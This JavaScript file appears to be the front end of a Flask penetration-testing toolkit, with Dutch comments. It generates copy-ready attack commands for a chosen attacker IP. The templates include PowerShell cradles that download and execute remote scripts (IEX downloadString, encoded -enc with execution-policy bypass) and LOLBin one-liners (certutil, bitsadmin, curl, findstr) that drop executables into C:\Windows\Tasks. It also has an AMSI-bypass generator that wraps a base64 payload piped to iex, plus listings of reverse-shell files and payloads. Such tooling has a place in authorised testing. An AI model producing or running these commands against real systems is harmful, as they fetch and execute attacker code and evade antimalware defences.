// Copyright (C) 2021 Jan-Karel Visser info@jan-karel.nl
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * ./reversshells.sh
 * Extra functionaliteit voor de flask app.
 */


(function () {
  'use strict';

  var form = document.getElementById('gen-form');
  var shellContainer = document.getElementById('shell-sections');
  var cradleContainer = document.getElementById('cradle-sections');
  var downloadContainer = document.getElementById('download-sections');
  var payloadContainer = document.getElementById('payload-sections');
  var fileSelect = document.getElementById('shell-file-select');
  var refreshBtn = document.getElementById('refresh-btn');
  var lhostInput = document.getElementById('lhost');
  var lportInput = document.getElementById('lport');

  // -----------------------------------------------------------------------
  // Helpers
  // -----------------------------------------------------------------------

  function escapeHtml(s) {
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
  }

  function copyToClipboard(text, btn) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(function () { showCopied(btn); });
    } else {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      showCopied(btn);
    }
  }

  function showCopied(btn) {
    var orig = btn.textContent;
    btn.textContent = 'Gekopieerd!';
    btn.classList.add('copied');
    setTimeout(function () {
      btn.textContent = orig;
      btn.classList.remove('copied');
    }, 1200);
  }

  function makeSnippet(command) {
    var snippet = document.createElement('div');
    snippet.className = 'shell-snippet';

    var code = document.createElement('code');
    code.textContent = command;

    var btn = document.createElement('button');
    btn.className = 'btn-copy';
    btn.textContent = 'Kopieer';
    btn.setAttribute('type', 'button');
    btn.addEventListener('click', function () { copyToClipboard(command, btn); });

    snippet.appendChild(code);
    snippet.appendChild(btn);
    return snippet;
  }

  function makeCategory(title, commands) {
    var card = document.createElement('div');
    card.className = 'shell-category';

    var header = document.createElement('div');
    header.className = 'shell-cat-header';
    header.textContent = title;

    var copyAll = document.createElement('button');
    copyAll.className = 'btn-copy btn-copy-all';
    copyAll.textContent = 'Kopieer alles';
    copyAll.setAttribute('type', 'button');
    copyAll.addEventListener('click', function () {
      copyToClipboard(commands.join('\n'), copyAll);
    });
    header.appendChild(copyAll);
    card.appendChild(header);

    for (var i = 0; i < commands.length; i++) {
      card.appendChild(makeSnippet(commands[i]));
    }
    return card;
  }

  // -----------------------------------------------------------------------
  // Shell file parsing (shell_*.txt)
  // -----------------------------------------------------------------------

  function parseSections(text) {
    var lines = text.split('\n');
    var sections = [];
    var current = null;

    for (var i = 0; i < lines.length; i++) {
      var line = lines[i].trim();
      if (!line) continue;
      if (/^\[.*placeholder\]$/.test(line)) continue;

      if (/^#{1,2}\s/.test(line)) {
        var title = line.replace(/^#{1,2}\s*/, '').replace(/\\n/g, '').trim();
        if (!title) continue;
        current = { title: title, commands: [] };
        sections.push(current);
        continue;
      }

      if (!current) continue;
      if (/^\.\/command\.sh\s/.test(line)) continue;

      current.commands.push(line);
    }

    return sections.filter(function (s) { return s.commands.length > 0; });
  }

  function renderShells(sections) {
    shellContainer.innerHTML = '';
    if (!sections.length) {
      shellContainer.innerHTML = '<p class="text-muted">Geen shells gevonden in bestand.</p>';
      return;
    }
    for (var i = 0; i < sections.length; i++) {
      shellContainer.appendChild(makeCategory(sections[i].title, sections[i].commands));
    }
  }

  function loadFile(filename) {
    if (!filename) {
      shellContainer.innerHTML = '<p class="text-muted">Selecteer een bestaand bestand of genereer nieuwe reverse shells.</p>';
      return;
    }
    shellContainer.innerHTML = '<p class="text-muted">Laden...</p>';

    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/reverseshells/files/' + encodeURIComponent(filename));
    xhr.onload = function () {
      if (xhr.status === 200) {
        renderShells(parseSections(xhr.responseText));
      } else {
        shellContainer.innerHTML = '<p class="text-danger">Kon bestand niet laden.</p>';
      }
    };
    xhr.send();
  }

  function loadFileList(autoSelect) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/reverseshells/files');
    xhr.onload = function () {
      if (xhr.status !== 200 || !fileSelect) return;
      var data = JSON.parse(xhr.responseText);
      var files = data.files || [];
      var current = fileSelect.value;

      fileSelect.innerHTML = '<option value="">-- selecteer bestand --</option>';
      for (var i = 0; i < files.length; i++) {
        var opt = document.createElement('option');
        opt.value = files[i].name;
        opt.textContent = files[i].name;
        fileSelect.appendChild(opt);
      }

      if (autoSelect && files.length > 0) {
        var target = autoSelect === true ? files[files.length - 1].name : autoSelect;
        fileSelect.value = target;
        loadFile(target);
      } else if (current) {
        fileSelect.value = current;
      }
    };
    xhr.send();
  }

  // -----------------------------------------------------------------------
  // AMSI Bypass (gebruikt amsi.fail.js)
  // -----------------------------------------------------------------------

  var amsiGenBtn = document.getElementById('amsi-gen-btn');
  var amsiEncBtn = document.getElementById('amsi-enc-btn');
  var amsiCode = document.getElementById('amsi-code');
  var amsiCopy = document.getElementById('amsi-copy');

  if (amsiGenBtn && typeof getPayload === 'function') {
    amsiGenBtn.addEventListener('click', function () {
      amsiCode.textContent = getPayload();
    });
  }

  if (amsiEncBtn && typeof getPayload === 'function' && typeof toBinary === 'function') {
    amsiEncBtn.addEventListener('click', function () {
      var payload = getPayload();
      var encoded = toBinary(payload);
      var cases = ['[System.Text.Encoding]', '[system.text.encoding]', '[SYSTEM.TEXT.ENCODING]'];
      var prefix = cases[Math.floor(Math.random() * cases.length)];
      amsiCode.textContent = prefix + '::Unicode.GetString([System.Convert]::FromBase64String("' + encoded + '"))|iex';
    });
  }

  if (amsiCopy && amsiCode) {
    amsiCopy.addEventListener('click', function () {
      copyToClipboard(amsiCode.textContent, amsiCopy);
    });
  }

  // -----------------------------------------------------------------------
  // PowerShell Cradles
  // -----------------------------------------------------------------------

  function renderCradles(ip, ps1Files) {
    cradleContainer.innerHTML = '';
    if (!ip) {
      cradleContainer.innerHTML = '<p class="text-muted">Vul LHOST in en klik "Overzicht vernieuwen".</p>';
      return;
    }
    if (!ps1Files.length) {
      cradleContainer.innerHTML = '<p class="text-muted">Geen .ps1 tools gevonden in http/tools/.</p>';
      return;
    }

    for (var i = 0; i < ps1Files.length; i++) {
      var name = ps1Files[i];
      var commands = [
        "IEX(New-Object Net.WebClient).downloadString('http://" + ip + "/tools/" + name + "')",
        "Invoke-WebRequest http://" + ip + "/tools/" + name + " | Invoke-Expression",
        "powershell -Version 2 -exec bypass -enc " + unicodeB64("IEX(New-Object Net.WebClient).downloadString('http://" + ip + "/tools/" + name + "')")
      ];
      cradleContainer.appendChild(makeCategory(name, commands));
    }
  }

  // -----------------------------------------------------------------------
  // Tool Downloads (.exe)
  // -----------------------------------------------------------------------

  function renderDownloads(ip, exeFiles) {
    downloadContainer.innerHTML = '';
    if (!ip) {
      downloadContainer.innerHTML = '<p class="text-muted">Vul LHOST in en klik "Overzicht vernieuwen".</p>';
      return;
    }
    if (!exeFiles.length) {
      downloadContainer.innerHTML = '<p class="text-muted">Geen .exe tools gevonden in http/tools/.</p>';
      return;
    }

    for (var i = 0; i < exeFiles.length; i++) {
      var name = exeFiles[i];
      var commands = [
        "certutil -urlcache -split -f http://" + ip + "/tools/" + name + " " + name,
        "cmd.exe /c curl http://" + ip + "/tools/" + name + " -o C:\\Windows\\Tasks\\" + name,
        "powershell -c (new-object System.Net.WebClient).DownloadFile('http://" + ip + "/tools/" + name + "','c:\\windows\\tasks\\" + name + "')",
        "powershell iwr -uri http://" + ip + "/tools/" + name + " -o c:\\windows\\tasks\\" + name,
        "bitsadmin /create 1 bitsadmin /addfile 1 http://" + ip + "/tools/" + name + " c:\\windows\\tasks\\" + name + " bitsadmin /RESUME 1 bitsadmin /complete 1",
        "findstr /V /L W3AllLov3LolBas \\\\\\\\" + ip + "\\share\\tools\\" + name + " > c:\\windows\\tasks\\" + name
      ];
      downloadContainer.appendChild(makeCategory(name, commands));
    }
  }

  // -----------------------------------------------------------------------
  // Generated Payloads listing
  // -----------------------------------------------------------------------

  function renderPayloads(payloads) {
    payloadContainer.innerHTML = '';
    if (!payloads.length) {
      payloadContainer.innerHTML = '<p class="text-muted">Geen payloads gevonden in http/payloads/.</p>';
      return;
    }

    var card = document.createElement('div');
    card.className = 'shell-category';

    var header = document.createElement('div');
    header.className = 'shell-cat-header';
    header.textContent = 'http/payloads/';
    card.appendChild(header);

    for (var i = 0; i < payloads.length; i++) {
      var p = payloads[i];
      var snippet = document.createElement('div');
      snippet.className = 'shell-snippet';

      var code = document.createElement('code');
      var size = p.size < 1024 ? p.size + ' B' : Math.round(p.size / 1024) + ' KB';
      code.textContent = p.name + '  (' + size + ')';

      var link = document.createElement('a');
      link.className = 'btn-copy';
      link.href = p.url;
      link.textContent = 'Downloaden';
      link.setAttribute('download', p.name);

      snippet.appendChild(code);
      snippet.appendChild(link);
      card.appendChild(snippet);
    }

    payloadContainer.appendChild(card);
  }

  // -----------------------------------------------------------------------
  // Base64 encoding helper (UTF-16LE for PowerShell -enc)
  // -----------------------------------------------------------------------

  function unicodeB64(str) {
    var bytes = [];
    for (var i = 0; i < str.length; i++) {
      var code = str.charCodeAt(i);
      bytes.push(code & 0xff);
      bytes.push((code >> 8) & 0xff);
    }
    var binary = '';
    for (var j = 0; j < bytes.length; j++) {
      binary += String.fromCharCode(bytes[j]);
    }
    return btoa(binary);
  }

  // -----------------------------------------------------------------------
  // Refresh: laad tools, cradles, downloads, payloads
  // -----------------------------------------------------------------------

  function refreshOverview() {
    var ip = (lhostInput || {}).value ? lhostInput.value.trim() : '';

    // Tools laden en cradles/downloads genereren
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/reverseshells/tools');
    xhr.onload = function () {
      if (xhr.status === 200) {
        var data = JSON.parse(xhr.responseText);
        renderCradles(ip, data.ps1 || []);
        renderDownloads(ip, data.exe || []);
      }
    };
    xhr.send();

    // Payloads laden
    var xhr2 = new XMLHttpRequest();
    xhr2.open('GET', '/api/reverseshells/payloads');
    xhr2.onload = function () {
      if (xhr2.status === 200) {
        var data = JSON.parse(xhr2.responseText);
        renderPayloads(data.payloads || []);
      }
    };
    xhr2.send();
  }

  // -----------------------------------------------------------------------
  // Zoekfilter
  // -----------------------------------------------------------------------

  var filterInput = document.getElementById('shell-filter');
  var filterContainers = [shellContainer, cradleContainer, downloadContainer, payloadContainer];

  function applyFilter() {
    var q = (filterInput ? filterInput.value : '').toLowerCase();

    for (var c = 0; c < filterContainers.length; c++) {
      var container = filterContainers[c];
      if (!container) continue;
      var categories = container.querySelectorAll('.shell-category');

      for (var i = 0; i < categories.length; i++) {
        var cat = categories[i];
        var headerEl = cat.querySelector('.shell-cat-header');
        var headerText = headerEl ? headerEl.textContent.toLowerCase() : '';
        var snippets = cat.querySelectorAll('.shell-snippet');
        var catMatch = !q || headerText.indexOf(q) !== -1;
        var visibleSnippets = 0;

        for (var j = 0; j < snippets.length; j++) {
          var codeEl = snippets[j].querySelector('code');
          var text = codeEl ? codeEl.textContent.toLowerCase() : '';
          var show = catMatch || text.indexOf(q) !== -1;
          snippets[j].style.display = show ? '' : 'none';
          if (show) visibleSnippets++;
        }

        cat.style.display = visibleSnippets > 0 || catMatch ? '' : 'none';
      }
    }
  }

  if (filterInput) {
    filterInput.addEventListener('input', applyFilter);
  }

  // -----------------------------------------------------------------------
  // Events
  // -----------------------------------------------------------------------

  if (fileSelect) {
    fileSelect.addEventListener('change', function () {
      loadFile(fileSelect.value);
    });
  }

  if (refreshBtn) {
    refreshBtn.addEventListener('click', function () {
      refreshOverview();
      loadFileList(false);
    });
  }

  if (form) {
    form.addEventListener('generator:done', function () {
      var bestand = (document.getElementById('bestand') || {}).value || 'shell';
      var lport = (lportInput || {}).value || '443';
      var filename = bestand.trim() + '_' + lport.trim() + '.txt';
      loadFileList(filename);
      refreshOverview();
    });
  }

  // Bij page load
  loadFileList(true);
  refreshOverview();
})();
